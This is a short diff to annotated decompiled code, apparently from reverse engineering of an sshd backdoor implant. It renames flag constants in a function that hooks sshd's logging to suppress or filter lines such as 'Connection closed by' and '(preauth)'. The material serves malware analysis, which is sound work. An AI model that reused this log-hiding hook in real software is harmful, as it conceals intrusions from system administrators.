@@ -18,13 +18,13 @@
 BOOL sshd_install_mm_log_handler_hook(cmd_arguments_t *cmd_flags,global_context_t *ctx)
 
 {
-  byte control_flags;
+  CmdControlFlags_t control_flags;
   sshd_log_ctx_t *log_ctx;
   void **handler_ctx_slot;
   void *saved_ctx_value;
   void **active_ctx_slot;
   log_handler_fn *log_handler_slot;
-  byte log_flag;
+  CmdControlFlags_t log_flag;
   
   log_ctx = ctx->sshd_log_ctx;
   // AutoDoc: Bail unless the log context, handler slot, ctx slot, and hook entry were all recovered.
@@ -36,7 +36,7 @@ BOOL sshd_install_mm_log_handler_hook(cmd_arguments_t *cmd_flags,global_context_
     return FALSE;
   }
   control_flags = cmd_flags->control_flags;
-  log_flag = control_flags & 8;
+  log_flag = control_flags & CMD_CTRL_LOG_FILTER;
   // AutoDoc: Only rewire logging when the control bit requested it or the implant is already running as root.
   if ((log_flag == 0) || (ctx->caller_uid == 0)) {
     saved_ctx_value = *handler_ctx_slot;
@@ -55,7 +55,7 @@ BOOL sshd_install_mm_log_handler_hook(cmd_arguments_t *cmd_flags,global_context_
     if (log_flag == 0) {
       log_ctx->log_squelched = TRUE;
     }
-    else if ((control_flags & 0x10) != 0) {
+    else if ((control_flags & CMD_CTRL_LOG_FILTER_REQUIRE_STRINGS) != 0) {
       // AutoDoc: Filter mode requires the `%s`, `Connection closed by`, and `(preauth)` strings; missing any of them aborts.
       if (log_ctx->fmt_percent_s == (char *)0x0) {
         return FALSE;
